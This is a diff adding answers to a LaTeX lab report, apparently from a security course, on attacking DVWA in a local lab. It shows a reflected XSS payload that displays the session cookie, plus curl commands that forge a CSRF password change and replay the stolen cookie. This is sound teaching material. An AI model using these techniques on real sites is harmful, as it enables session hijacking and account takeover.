@@ -46,5 +46,16 @@
 \section*{Activity3}
 
 \begin{enumerate}
-    \item 
+    \item When modifying the password, the server uses HTTP parameters (\texttt{password\_new} and \texttt{password\_conf}).\\
+    This means any request can be formed to change the password for the \texttt{admin} user (hard-coded). But, when trying with \texttt{curl -L}\footnote{\texttt{-L to allow redirections.}}\texttt{ "http://192.168.56.3/dvwa/\\
+    vulnerabilities/csrf/?password\_new=caca\&password\_conf=caca\&Change=Change\#"}, it redirects us to the login screen.\\
+    This is because it recognises it's a new session (no cookies saved) and asks us to log in.
+    \item As the for XSS Reflected input is not sanitized, we can add some custom code to be executed. Let's steal the session key.\\
+    By inputting \texttt{<script>alert(document.cookie)</script>}, we can generate an alert that outputs the session cookie. For me, it was \texttt{security=low;\\
+    PHPSESSID=374aa92f619ccb2be41df1fe0048e60b}.
+    \item Thanks to the previous session cookie, we can update our request to include that cookie, as follows:\\
+    \texttt{curl -b "security=low; PHPSESSID=374aa92f619ccb2be41df1fe0048e60b"\\
+    -L "http://192.168.56.3/dvwa/vulnerabilities/csrf/\\
+    ?password\_new=caca\&password\_conf=caca\&Change=Change\#"}\\
+    Which works perfectly.
 \end{enumerate}
